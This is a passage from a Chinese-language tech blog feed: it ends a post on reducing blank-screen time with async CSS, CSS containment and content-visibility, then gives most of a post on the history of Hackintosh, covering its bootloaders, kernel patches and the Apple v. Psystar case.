属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> 